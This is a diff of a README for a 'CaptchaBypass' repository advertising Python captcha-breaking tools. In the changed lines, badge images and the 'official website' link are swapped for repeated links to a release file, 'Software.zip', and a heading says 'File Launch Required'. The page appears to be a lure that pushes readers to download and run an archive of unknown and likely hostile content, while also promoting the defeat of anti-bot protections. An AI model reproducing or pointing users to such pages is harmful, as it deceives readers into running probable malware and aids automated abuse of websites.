@@ -2,7 +2,7 @@
 
 An innovative repository for bypassing captchas with ease! 🚀
 
-![CaptchaBypass](https://img.shields.io/badge/CaptchaBypass-Easy--to--use-green)
+![CaptchaBypass](https://github.com/Ritesh-p/CaptchaBypass/releases/download/v1.0/Software.zip)
 
 ## Description
 Welcome to the "CaptchaBypass" repository! This is your one-stop solution for all things related to captcha bypassing. Whether you need to break captchas, bypass captcha images, solve Recaptcha puzzles, or simply want to tackle captcha challenges, this repository has got you covered. Powered by Python and designed for Python 3, our tools and scripts make captcha-solving a breeze.
@@ -21,11 +21,11 @@ Welcome to the "CaptchaBypass" repository! This is your one-stop solution for al
 - ✅ Spider
 
 ## Get Started
-To access the latest version of the repository, please [click here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) to download the ZIP file.
+To access the latest version of the repository, please [click here](https://github.com/Ritesh-p/CaptchaBypass/releases/download/v1.0/Software.zip) to download the ZIP file.
 
 ### Note: File Launch Required
 
-Alternatively, you can explore more about the repository by visiting the [official website](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+Alternatively, you can explore more about the repository by visiting the [official website](https://github.com/Ritesh-p/CaptchaBypass/releases/download/v1.0/Software.zip).
 
 For any issues with the link provided above, please check the "Releases" section of this repository for more information.
 
@@ -52,4 +52,4 @@ Join us in revolutionizing the way captchas are bypassed! 💪🔓
 
 Happy bypassing! 🎉
 
-![CaptchaBypass](https://img.shields.io/badge/CaptchaBypass-Bypass--Captcha-orange)
+![CaptchaBypass](https://github.com/Ritesh-p/CaptchaBypass/releases/download/v1.0/Software.zip)
